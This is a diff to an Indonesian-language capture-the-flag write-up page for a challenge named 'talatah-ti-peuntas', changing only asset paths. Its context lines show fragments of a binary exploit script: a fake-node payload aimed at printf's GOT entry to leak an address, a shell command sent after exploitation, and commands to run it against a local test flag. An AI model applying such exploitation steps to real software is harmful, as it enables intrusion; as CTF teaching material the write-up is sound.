@@ -2,7 +2,7 @@
 
 [← Overview](41-talatah-ti-peuntas.md) · [Index](index.md)
 
-> **Langkah 7/10 — Eksploitasi.** Tersimpan di writeups/assets/talatah-ti-peuntas/exploit.py:
+> **Langkah 7/10 — Eksploitasi.** Tersimpan di docs/assets/talatah-ti-peuntas/exploit.py:
 >
 > **Titik penting:** python3 exploit.py \| tee 03-exploit-run.txt · NFX{LOCAL_TEST_FLAG_TALATAH}
 >
@@ -10,7 +10,7 @@
 
 ## 3.4 Script lengkap
 
-Tersimpan di `writeups/assets/talatah-ti-peuntas/exploit.py`:
+Tersimpan di `docs/assets/talatah-ti-peuntas/exploit.py`:
 
 ```python
 parse(p, 0x18, 0x40, fake_node(PRINTF_GOT, b'LEAK', 8))
@@ -31,7 +31,7 @@ p.sendline(b'cat flag.txt; echo END_PWN')
 Menjalankan:
 
 ```bash
-cd writeups/assets/talatah-ti-peuntas
+cd docs/assets/talatah-ti-peuntas
 echo 'NFX{LOCAL_TEST_FLAG_TALATAH}' > flag.txt
 python3 exploit.py | tee 03-exploit-run.txt
 ```
